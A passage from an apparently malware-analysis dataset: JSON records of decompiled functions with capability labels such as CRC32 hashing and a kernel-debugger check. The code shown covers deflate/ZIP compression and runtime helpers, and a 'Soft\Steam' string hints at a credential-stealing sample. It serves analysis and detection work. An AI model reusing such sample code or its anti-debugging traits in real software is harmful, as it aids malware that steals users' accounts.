        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n\nvoid __cdecl fcn.00427a00(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    int16_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int16_t *piVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint var_24h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    iVar3 = 0;\n    iVar6 = 1;\n    piVar7 = arg_8h + 0xfe4;\n    do {\n        iVar3 = (*piVar7 + iVar3) * 2;\n        *(&var_24h + iVar6 * 2) = iVar3;\n        iVar6 = iVar6 + 1;\n        piVar7 = piVar7 + 1;\n    } while (iVar6 < 0x10);\n    iVar6 = 0;\n    if (-1 < arg_10h) {\n        do {\n            uVar8 = *(arg_ch + 2 + iVar6 * 4);\n            if (uVar8 != 0) {\n                uVar1 = *(&var_24h + uVar8 * 2);\n                uVar4 = uVar1;\n                *(&var_24h + uVar8 * 2) = uVar1 + 1;\n                uVar2 = 0;\n                do {\n                    uVar5 = uVar2;\n                    uVar9 = uVar4 & 1;\n                    uVar8 = uVar8 - 1;\n                    uVar4 = uVar4 >> 1;\n                    uVar2 = (uVar5 | uVar9) * 2;\n                } while (0 < uVar8);\n                *(arg_ch + iVar6 * 4) = uVar5 | uVar9;\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 <= arg_10h);\n    }\n    fcn.0042a75a(var_24h);\n    return;\n}\n",
        "token_count": 507
    },
    "00427f70": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00427f70(uint16_t *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint16_t uVar1;\n    int32_t arg_10h_00;\n    int32_t arg_8h_00;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    arg_8h_00 = arg_8h;\n    uVar3 = 0;\n    var_8h = 0;\n    var_1h._0_1_ = 0;\n    if (*(arg_8h + 0x1af2c) != 0) {\n        arg_8h = arg_8h + 0x9f2c;\n        do {\n            if ((uVar3 & 7) == 0) {\n                var_1h._0_1_ = *(var_8h + 0x19f2c + arg_8h_00);\n                var_8h = var_8h + 1;\n            }\n            uVar5 = *(arg_8h_00 + 0x1f2c + uVar3);\n            uVar3 = uVar3 + 1;\n            if ((var_1h & 1) == 0) {\n                fcn.00425e40(arg_8h_00, *(arg_ch + uVar5 * 4), *(arg_ch + 2 + uVar5 * 4));\n            }\n            else {\n                uVar4 = *(uVar5 + 0x1b3d + arg_8h_00);\n                fcn.00425e40(arg_8h_00, *(arg_ch + 0x404 + uVar4 * 4), *(arg_ch + 0x406 + uVar4 * 4));\n                arg_10h_00 = *(uVar4 * 4 + 0x4480b0);\n                if (arg_10h_00 != 0) {\n                    fcn.00425e40(arg_8h_00, uVar5 - *(arg_8h_00 + 0x1e40 + uVar4 * 4), arg_10h_00);\n                }\n                uVar1 = *arg_8h;\n                uVar5 = uVar1;\n                arg_8h = arg_8h + 1;\n                if (uVar5 < 0x100) {\n                    uVar2 = *(uVar5 + 0x1c3d + arg_8h_00);\n                }\n                else {\n                    uVar2 = *((uVar1 >> 7) + 0x1d3d + arg_8h_00);\n                }\n                uVar4 = uVar2;\n                fcn.00425e40(arg_8h_00, *(arg_10h + uVar4 * 4), *(arg_10h + 2 + uVar4 * 4));\n                if (*(\"\\\\Soft\\\\Steam\\\\\" + uVar4 * 4) != 0) {\n                    fcn.00425e40(arg_8h_00, uVar5 - *(arg_8h_00 + 0x1eb4 + uVar4 * 4), *(\"\\\\Soft\\\\Steam\\\\\" + uVar4 * 4))\n                    ;\n                }\n            }\n            var_1h._0_1_ = var_1h >> 1;\n        } while (uVar3 < *(arg_8h_00 + 0x1af2c));\n    }\n    fcn.00425e40(arg_8h_00, *(arg_ch + 0x400), *(arg_ch + 0x402));\n    return;\n}\n",
        "token_count": 878
    },
    "004284f0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004284f0(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    char cVar1;\n    int32_t arg_8h_00;\n    uint32_t uVar2;\n    int32_t iVar3;\n    ushort *puVar4;\n    uint32_t uVar5;\n    uint16_t *puVar6;\n    uint32_t uVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    char *pcVar11;\n    int32_t iVar12;\n    uint32_t uVar13;\n    \n    arg_8h_00 = arg_8h;\n    *(arg_8h + 0x1af50) = arg_ch;\n    *(arg_8h + 0x1af48) = 0;\n    *(arg_8h + 0x1af44) = 0;\n    *(arg_8h + 0x1af4c) = 0;\n    if (*(arg_8h + 0xe7e) == 0) {\n        arg_ch = arg_8h + 0x1e40;\n        iVar3 = 0;\n        cVar1 = '\\0';\n        puVar8 = 0x4480b0;\n        do {\n            iVar10 = 0;\n            *arg_ch = iVar3;\n            if (0 < 1 << (*puVar8 & 0x1f)) {\n                do {\n                    *(arg_8h + 0x1b3d + iVar3) = cVar1;\n                    iVar10 = iVar10 + 1;\n                    iVar3 = iVar3 + 1;\n                } while (iVar10 < 1 << (*puVar8 & 0x1f));\n            }\n            arg_ch = arg_ch + 1;\n            cVar1 = cVar1 + '\\x01';\n            puVar8 = puVar8 + 1;\n        } while (puVar8 < 0x448120);\n        *(iVar3 + 0x1b3c + arg_8h) = cVar1;\n        arg_ch = arg_8h + 0x1eb4;\n        iVar3 = 0;\n        iVar10 = 0;\n        pcVar11 = \"\\\\Soft\\\\Steam\\\\\";\n        do {\n            *arg_ch = iVar3;\n            arg_8h = NULL;\n            if (0 < 1 << (*pcVar11 & 0x1f)) {\n                do {\n                    arg_8h = arg_8h + 1;\n                    *(arg_8h_00 + 0x1c3d + iVar3) = iVar10;\n                    iVar3 = iVar3 + 1;\n                } while (arg_8h < 1 << (*pcVar11 & 0x1f));\n            }\n            arg_ch = arg_ch + 1;\n            pcVar11 = pcVar11 + 4;\n            iVar10 = iVar10 + 1;\n        } while (pcVar11 < 0x448178);\n        iVar3 = iVar3 >> 7;\n        if (iVar10 < 0x1e) {\n            puVar8 = \"\\\\Soft\\\\Steam\\\\\" + iVar10 * 4;\n            arg_8h = arg_8h_00 + 0x1eb4 + iVar10 * 4;\n            do {\n                *arg_8h = iVar3 << 7;\n                iVar12 = 0;\n                if (0 < 1 << (*puVar8 - 7U & 0x1f)) {\n                    do {\n                        *(arg_8h_00 + 0x1d3d + iVar3) = iVar10;\n                        iVar12 = iVar12 + 1;\n                        iVar3 = iVar3 + 1;\n                    } while (iVar12 < 1 << (*puVar8 - 7U & 0x1f));\n                }\n                arg_8h = arg_8h + 1;\n                puVar8 = puVar8 + 1;\n                iVar10 = iVar10 + 1;\n            } while (puVar8 < 0x4481b0);\n        }\n        *(arg_8h_00 + 0xfe4) = 0;\n        *(arg_8h_00 + 0xfe8) = 0;\n        *(arg_8h_00 + 0xfec) = 0;\n        *(arg_8h_00 + 0xff0) = 0;\n        *(arg_8h_00 + 0xff4) = 0;\n        *(arg_8h_00 + 0xff8) = 0;\n        *(arg_8h_00 + 0xffc) = 0;\n        *(arg_8h_00 + 0x1000) = 0;\n        puVar4 = arg_8h_00 + 0xa02;\n        iVar3 = 0x18;\n        do {\n            puVar4[-2] = 8;\n            *(arg_8h_00 + 0xff4) = *(arg_8h_00 + 0xff4) + 1;\n            *puVar4 = 8;\n            *(arg_8h_00 + 0xff4) = *(arg_8h_00 + 0xff4) + 1;\n            puVar4[2] = 8;\n            *(arg_8h_00 + 0xff4) = *(arg_8h_00 + 0xff4) + 1;\n            puVar4[4] = 8;\n            *(arg_8h_00 + 0xff4) = *(arg_8h_00 + 0xff4) + 1;\n            puVar4[6] = 8;\n            *(arg_8h_00 + 0xff4) = *(arg_8h_00 + 0xff4) + 1;\n            puVar4[8] = 8;\n            *(arg_8h_00 + 0xff4) = *(arg_8h_00 + 0xff4) + 1;\n            puVar4 = puVar4 + 0xc;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n        puVar4 = arg_8h_00 + 0xc3e;\n        iVar3 = 0x70;\n        do {\n            *puVar4 = 9;\n            *(arg_8h_00 + 0xff6) = *(arg_8h_00 + 0xff6) + 1;\n            puVar4 = puVar4 + 2;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n        iVar3 = 0x18;\n        puVar4 = arg_8h_00 + 0xdfe;\n        do {\n            *puVar4 = 7;\n            *(arg_8h_00 + 0xff2) = *(arg_8h_00 + 0xff2) + 1;\n            puVar4 = puVar4 + 2;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n        puVar4 = arg_8h_00 + 0xe5e;\n        iVar3 = 8;\n        do {\n            *puVar4 = 8;\n            *(arg_8h_00 + 0xff4) = *(arg_8h_00 + 0xff4) + 1;\n            puVar4 = puVar4 + 2;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n        fcn.00427a00(arg_8h_00, arg_8h_00 + 0x9fc, 0x11f);\n        puVar6 = arg_8h_00 + 0xe7c;\n        uVar13 = 0;\n        do {\n            iVar3 = 5;\n            puVar6[1] = 5;\n            uVar2 = 0;\n            uVar7 = uVar13;\n            do {\n                uVar5 = uVar2;\n                uVar9 = uVar7 & 1;\n                iVar3 = iVar3 + -1;\n                uVar7 = uVar7 >> 1;\n                uVar2 = (uVar5 | uVar9) * 2;\n            } while (0 < iVar3);\n            *puVar6 = uVar5 | uVar9;\n            uVar13 = uVar13 + 1;\n            puVar6 = puVar6 + 2;\n        } while (uVar13 < 0x1e);\n        fcn.00425770(arg_8h_00);\n    }\n    return;\n}\n",
        "token_count": 1920
    },
    "00429060": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4b0h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00429060(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    bool bVar2;\n    char cVar3;\n    uchar uVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uint8_t **in_ECX;\n    uint8_t *puVar10;\n    int16_t iVar11;\n    uint unaff_ESI;\n    uint8_t *puVar12;\n    uint8_t *puVar13;\n    uint uVar14;\n    uint8_t **ppuVar15;\n    uint *arg_8h_00;\n    uint8_t **var_4b0h;\n    int32_t var_4ach;\n    int32_t var_4a8h;\n    uint8_t *var_4a4h;\n    int32_t var_4a0h;\n    uint var_499h;\n    uint var_494h;\n    uint var_490h;\n    uint8_t *var_48ch;\n    uint8_t *var_488h;\n    uint8_t *var_484h;\n    uint8_t *var_480h;\n    int32_t var_47ch;\n    int32_t var_478h;\n    uint var_474h;\n    uint var_470h;\n    ushort var_46ch;\n    uint var_46ah;\n    uint8_t *var_464h;\n    uint8_t *var_460h;\n    uint var_45ch;\n    uint *var_358h;\n    uint *var_354h;\n    uint var_350h;\n    uint var_34ch;\n    uint var_248h;\n    uint var_144h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_30h;\n    uint var_24h;\n    uchar var_19h;\n    uint var_18h;\n    uchar var_14h;\n    uint var_13h;\n    uchar var_fh;\n    uchar var_eh;\n    uchar var_dh;\n    uchar var_ch;\n    uchar var_bh;\n    uchar var_ah;\n    uchar var_9h;\n    uchar var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    if (in_ECX[5] != NULL) {\n        fcn.0042a75a(in_ECX);\n        return;\n    }\n    if (*(in_ECX + 0xb) != '\\0') {\n        fcn.0042a75a(in_ECX);\n        return;\n    }\n    var_4a8h = 0;\n    if ((*in_ECX != NULL) && (arg_14h != 4)) {\n        var_4a8h = 0xc;\n    }\n    arg_8h_00 = &var_134h;\n    (**0x4630e4)(arg_8h_00, arg_8h);\n    if (var_134h == '\\0') {\n        fcn.0042a75a(unaff_ESI);\n        return;\n    }\n    puVar5 = &var_134h;\n    do {\n        if (*puVar5 == '\\\\') {\n            *puVar5 = '/';\n        }\n        puVar5 = puVar5 + 1;\n    } while (*puVar5 != '\\0');\n    var_499h._0_1_ = arg_14h == 4;\n    if (var_499h) {\n        iVar6 = fcn.0042ad20(&var_134h);\n        bVar2 = true;\n        if (*(&var_138h + iVar6 + 3) == '/') goto code_r0x00429157;\n    }\n    else {\ncode_r0x00429157:\n        bVar2 = false;\n    }\n    iVar11 = 8;\n    var_4ach = 8;\n    if ((var_499h) || (cVar3 = fcn.00426d60(&var_134h),  cVar3 != '\\0')) {\n        iVar11 = 0;\n        var_4ach = 0;\n    }\n    if (arg_14h == 2) {\n        iVar6 = fcn.00428240(arg_ch);\n    }\n    else if (arg_14h == 1) {\n        iVar6 = fcn.00427470(arg_ch, arg_10h);\n    }\n    else if (arg_14h == 3) {\n        iVar6 = fcn.004275d0(arg_ch, arg_10h);\n    }\n    else {\n        if (arg_14h != 4) goto code_r0x0042999f;\n        iVar6 = fcn.00427710();\n    }\n    if (iVar6 != 0) goto code_r0x0042999f;\n    var_138h = 0;\n    (**0x4630e4)(&var_45ch, 0x4452bc);\n    (**0x4630e4)(&var_34ch, &var_134h);\n    var_47ch = (**0x462f30)(&var_34ch);\n    if (bVar2) {\n        (**0x463038)(&var_34ch, 0x446ee4);\n        var_47ch = var_47ch + 1;\n    }\n    (**0x4630e4)(&var_248h, 0x4452bc);\n    var_46ah._0_2_ = 0;\n    var_48ch = in_ECX[0x1a];\n    var_46ah._2_2_ = 8;\n    var_350h = 0;\n    var_470h = 0;\n    var_144h = 1;\n    var_13ch = 0;\n    var_494h = 0x140b17;\n    var_488h = NULL;\n    var_490h._0_2_ = 8;\n    if ((*in_ECX != NULL) && (!var_499h)) {\n        var_46ah._2_2_ = 9;\n        var_490h._0_2_ = 9;\n    }\n    if ((iVar11 == 0) && (-1 < in_ECX[0x1c])) {\n        var_484h = in_ECX[0x1c] + var_4a8h;\n    }\n    else {\n        var_484h = NULL;\n    }\n    var_480h = in_ECX[0x1c];\n    var_464h = in_ECX[0x13];\n    var_460h = in_ECX[6] + in_ECX[4];\n    var_13h._0_1_ = *(in_ECX + 0x16);\n    var_46ch = 0;\n    var_358h = &var_18h;\n    var_354h = &var_30h;\n    puVar12 = in_ECX[0x16];\n    var_13h._1_1_ = puVar12 >> 8;\n    var_13h._2_1_ = puVar12 >> 0x10;\n    var_13h._3_1_ = puVar12 >> 0x18;\n    var_fh = *(in_ECX + 0x14);\n    puVar12 = in_ECX[0x14];\n    var_eh = puVar12 >> 8;\n    var_ch = puVar12 >> 0x18;\n    var_dh = puVar12 >> 0x10;\n    var_bh = *(in_ECX + 0x18);\n    puVar12 = in_ECX[0x18];\n    var_ah = puVar12 >> 8;\n    var_8h = puVar12 >> 0x18;\n    var_9h = puVar12 >> 0x10;\n    var_478h = 0x11;\n    var_474h = 9;\n    var_18h = 0xd5455;\n    var_14h = 7;\n    var_490h._2_2_ = iVar11;\n    fcn.0042a840(&var_30h, &var_18h, 9);\n    puVar5 = &var_494h;\n    uVar14 = 0x427620;\n    ppuVar15 = in_ECX;\n    var_4b0h = in_ECX;\n    *(var_354h + 2) = 5;\n    iVar6 = fcn.004263b0(puVar5, uVar14, ppuVar15);\n    if (iVar6 != 0) {\n        fcn.004278d0();\n        goto code_r0x0042941a;\n    }\n    in_ECX[6] = in_ECX[6] + var_478h + 0x1e + var_47ch;\n    if (in_ECX[5] != NULL) {\n        fcn.004278d0();\n        fcn.0042a75a(arg_8h_00);\n        return;\n    }\n    ppuVar15 = in_ECX + 0xc;\n    in_ECX[0xd] = 0x23456789;\n    in_ECX[0xe] = 0x34567890;\n    puVar12 = *in_ECX;\n    *ppuVar15 = 0x12345678;\n    for (; (puVar12 != NULL && (*puVar12 != 0)); puVar12 = puVar12 + 1) {\n        fcn.00426d10(ppuVar15, *puVar12);\n    }\n    if (*0x463168 == '\\0') {\n        uVar7 = (**0x462e90)();\n        uVar8 = (**0x4630a4)();\n        fcn.0042e4be(uVar7 ^ uVar8);\n    }\n    iVar6 = 0;\n    do {\n        iVar9 = fcn.0042e4d0();\n        *(&var_24h + iVar6) = iVar9 >> 7;\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0xc);\n    var_4a4h = in_ECX[0xd];\n    puVar12 = in_ECX[0xe];\n    var_19h = var_48ch >> 8;\n    puVar10 = *ppuVar15;\n    var_4a0h = 0;\n    do {\n        puVar10 = *(((*(&var_24h + var_4a0h) ^ puVar10) & 0xff) * 4 + 0x448250) ^ puVar10 >> 8;\n        uVar7 = puVar12 & 0xfffd | 2;\n        puVar13 = (var_4a4h + (puVar10 & 0xff)) * 0x8088405 + 1;\n        *ppuVar15 = puVar10;\n        in_ECX[0xd] = puVar13;\n        puVar12 = puVar12 >> 8 ^ *(((puVar13 >> 0x18 ^ puVar12) & 0xff) * 4 + 0x448250);\n        uVar1 = *(&var_24h + var_4a0h);\n        in_ECX[0xe] = puVar12;\n        *(&var_24h + var_4a0h) = (uVar7 ^ 1) * uVar7 >> 8 ^ uVar1;\n        uVar1 = *(&var_24h + var_4a0h + 1);\n        uVar7 = puVar12 & 0xfffd | 2;\n        puVar10 = *(((uVar1 ^ puVar10) & 0xff) * 4 + 0x448250) ^ puVar10 >> 8;\n        puVar13 = (puVar13 + (puVar10 & 0xff)) * 0x8088405 + 1;\n        *ppuVar15 = puVar10;\n        in_ECX[0xd] = puVar13;\n        puVar12 = puVar12 >> 8 ^ *(((puVar13 >> 0x18 ^ puVar12) & 0xff) * 4 + 0x448250);\n        *(&var_24h + var_4a0h + 1) = (uVar7 ^ 1) * uVar7 >> 8 ^ uVar1;\n        uVar1 = *(&var_24h + var_4a0h + 2);\n        uVar7 = puVar12 & 0xfffd | 2;\n        in_ECX[0xe] = puVar12;\n        puVar10 = *(((uVar1 ^ puVar10) & 0xff) * 4 + 0x448250) ^ puVar10 >> 8;\n        *ppuVar15 = puVar10;\n        puVar13 = (puVar13 + (puVar10 & 0xff)) * 0x8088405 + 1;\n        in_ECX[0xd] = puVar13;\n        puVar12 = puVar12 >> 8 ^ *(((puVar13 >> 0x18 ^ puVar12) & 0xff) * 4 + 0x448250);\n        *(&var_24h + var_4a0h + 2) = (uVar7 ^ 1) * uVar7 >> 8 ^ uVar1;\n        uVar1 = *(&var_24h + var_4a0h + 3);\n        uVar7 = puVar12 & 0xfffd | 2;\n        in_ECX[0xe] = puVar12;\n        puVar10 = *(((uVar1 ^ puVar10) & 0xff) * 4 + 0x448250) ^ puVar10 >> 8;\n        iVar6 = var_4a0h + 4;\n        var_4a4h = (puVar13 + (puVar10 & 0xff)) * 0x8088405 + 1;\n        in_ECX[0xd] = var_4a4h;\n        *ppuVar15 = puVar10;\n        puVar12 = puVar12 >> 8 ^ *(((var_4a4h >> 0x18 ^ puVar12) & 0xff) * 4 + 0x448250);\n        in_ECX[0xe] = puVar12;\n        *(&var_24h + var_4a0h + 3) = (uVar7 ^ 1) * uVar7 >> 8 ^ uVar1;\n        var_4a0h = iVar6;\n    } while (iVar6 < 0xc);\n    iVar6 = 0;\n    if (*var_4b0h == NULL) {\ncode_r0x0042974d:\n        uVar4 = 0;\n    }\n    else {\n        if (var_499h == '\\0') {\n            fcn.004272a0(&var_24h, 0xc);\n            var_4b0h[6] = var_4b0h[6] + 0xc;\n        }\n        if ((*var_4b0h == NULL) || (var_499h != '\\0')) goto code_r0x0042974d;\n        uVar4 = 1;\n    }\n    *(var_4b0h + 0x2d) = uVar4;\n    if (var_499h == '\\0') {\n        if (var_4ach == 8) {\n            iVar6 = fcn.00428f40(&var_494h);\n        }\n        else if (var_4ach == 0) {\n            iVar6 = fcn.00427930();\n        }\n    }\n    else {\n        var_4b0h[0x24] = NULL;\n    }\n    *(var_4b0h + 0x2d) = 0;\n    if ((*(var_4b0h + 0x20) != '\\0') && (var_4b0h[0x1f] != NULL)) {\n        (**0x462ed0)(var_4b0h[0x1f]);\n    }\n    puVar12 = var_4b0h[0x1d];\n    var_4b0h[6] = var_4b0h[6] + var_4b0h[0x24];\n    var_4b0h[0x1f] = NULL;\n    var_4b0h[0x1c] = puVar12;\n    if (var_4b0h[5] == NULL) {\n        if (iVar6 != 0) {\ncode_r0x0042941a:\n            fcn.0042a75a(arg_8h_00);\n            return;\n        }\n        var_488h = var_4b0h[0x1e];\n        puVar10 = var_4b0h[0x24] + var_4a8h;\n        var_480h = puVar12;\n        if ((*(var_4b0h + 7) == '\\0') || ((*var_4b0h != NULL && (var_499h == '\\0')))) {\n            if ((var_490h._2_2_ != var_4ach) || ((var_4ach == 0 && (var_484h != puVar10)))) {\n                var_484h = puVar10;\n                fcn.0042a75a(arg_8h_00);\n                return;\n            }\n            var_484h = puVar10;\n            iVar6 = fcn.004265f0(&var_494h, 0x427620, var_4b0h);\n            if (iVar6 != 0) goto code_r0x0042941a;\n            var_4b0h[6] = var_4b0h[6] + 0x10;\n            var_490h._0_2_ = var_46ah._2_2_;\n        }\n        else {\n            if ((var_490h & 1) == 0) {\n                var_490h._0_2_ = var_490h & 0xfff7;\n            }\n            var_46ah._2_2_ = var_490h;\n            var_490h._2_2_ = var_4ach;\n            var_484h = puVar10;\n            cVar3 = fcn.00427400(var_460h - var_4b0h[4]);\n            if (cVar3 == '\\0') {\ncode_r0x00429879:\n                fcn.0042a75a(arg_8h_00);\n                return;\n            }\n            iVar6 = fcn.004263b0(&var_494h, 0x427620, var_4b0h);\n            if (iVar6 != 0) goto code_r0x0042941a;\n            cVar3 = fcn.00427400(var_4b0h[6]);\n            if (cVar3 == '\\0') goto code_r0x00429879;\n        }\n        if (var_4b0h[5] == NULL) {\n            uVar14 = fcn.0042b2b1(var_474h);\n            fcn.0042a840(uVar14, var_354h, var_474h);\n            var_354h = uVar14;\n            puVar10 = fcn.0042b2b1(0x360);\n            fcn.0042a840(puVar10, &var_494h, 0x360);\n            puVar12 = var_4b0h[0x11];\n            if (puVar12 != NULL) {\n                iVar6 = *(puVar12 + 0x35c);\n                while (iVar6 != 0) {\n                    puVar12 = *(puVar12 + 0x35c);\n                    iVar6 = *(puVar12 + 0x35c);\n                }\n                *(puVar12 + 0x35c) = puVar10;\n                fcn.0042a75a(arg_8h_00);\n                return;\n            }\n            var_4b0h[0x11] = puVar10;\n            fcn.0042a75a(arg_8h_00);\n            return;\n        }\n    }\ncode_r0x0042999f:\n    fcn.0042a75a(arg_8h_00);\n    return;\n}\n",
        "token_count": 4597
    },
    "00429c18": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00429c18(uint32_t arg_8h)\n\n{\n    fcn.0042aca3();\n    if ((arg_8h & 1) != 0) {\n        fcn.0042a679();\n    }\n    return;\n}\n",
        "token_count": 60
    },
    "0042b2b1": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042b2b1(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    char *var_10h;\n    uint var_4h;\n    \n    do {\n        iVar2 = fcn.0042a769(arg_8h);\n        if (iVar2 != 0) {\n            return;\n        }\n        iVar2 = fcn.00431651(arg_8h);\n    } while (iVar2 != 0);\n    if ((*0x46338c & 1) == 0) {\n        *0x46338c = *0x46338c | 1;\n        var_4h = 0x448d5c;\n        fcn.0042aba1(&var_4h);\n        *0x463380 = \"WSHS4954XGCLRNSRX\";\n        fcn.0042d53e(0x43f611);\n    }\n    fcn.0042acd5(0x463380);\n    var_10h = \"WSHS4954XGCLRNSRX\";\n    fcn.0042b331(&var_10h, 0x44c6c0);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 282
    },
    "0042a229": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042a229(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x4486e0;\n    if ((arg_8h & 1) != 0) {\n        fcn.0042a679();\n    }\n    return;\n}\n",
        "token_count": 73
    },
    "0042a694": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042a694(uint32_t arg_8h)\n\n{\n    fcn.0042a684();\n    if ((arg_8h & 1) != 0) {\n        fcn.0042a679();\n    }\n    return;\n}\n",
        "token_count": 60
    },
    "0042acae": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042acae(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x448d34;\n    fcn.0042ac0b();\n    if ((arg_8h & 1) != 0) {\n        fcn.0042a679();\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "004300d0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004300d0(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x4496f8;\n    fcn.0042aca3();\n    if ((arg_8h & 1) != 0) {\n        fcn.0042a679();\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "00434a4b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00434a4b(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00433b40(0x44e960, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.0043008f();\n        *puVar2 = 0;\n        puVar2 = fcn.0043007c();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x464118)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x464120;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.0043a5a6(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.0043007c();\n                    *puVar2 = 9;\n                    puVar2 = fcn.0043008f();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.0043434e(arg_8h_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.00434b17();\n                goto code_r0x00434b0e;\n            }\n        }\n        puVar2 = fcn.0043008f();\n        *puVar2 = 0;\n        puVar2 = fcn.0043007c();\n        *puVar2 = 9;\n        fcn.00431906();\n    }\ncode_r0x00434b0e:\n    fcn.00433b85();\n    return;\n}\n",
        "token_count": 612
    },
    "00438f27": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00438f27(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00433b40(0x44ea20, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.0043008f();\n        *puVar2 = 0;\n        puVar2 = fcn.0043007c();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x464118)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x464120;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.0043a5a6(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.0043007c();\n                    *puVar2 = 9;\n                    puVar2 = fcn.0043008f();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.00438eb2(arg_8h_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                